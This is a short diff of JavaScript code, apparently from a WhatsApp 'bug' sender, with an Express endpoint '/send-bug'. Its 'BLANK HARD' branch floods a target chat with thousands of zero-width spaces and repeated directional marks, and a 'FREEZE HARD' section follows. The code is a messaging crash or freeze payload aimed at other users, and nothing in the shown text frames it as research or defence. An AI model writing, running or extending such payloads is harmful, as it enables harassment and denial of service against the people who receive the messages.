@@ -134,7 +134,7 @@ app.post('/send-bug', async (req, res) => {
         else if (effect === 'BLANK HARD') {
             await sock.sendMessage(chatId, { text: '\u200B'.repeat(3000) });
             await sock.sendMessage(chatId, { text: '‎‏‎‏‎‏‎‏‎‏‎‏‎‏'.repeat(200) });
-            await sock.sendMessage(chatId, { text: '​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​'.repeat(100) });
+            await sock.sendMessage(chatId, { text: ''.repeat(100) });
         }
 
         // --- FREEZE HARD ----------------------------------------------------
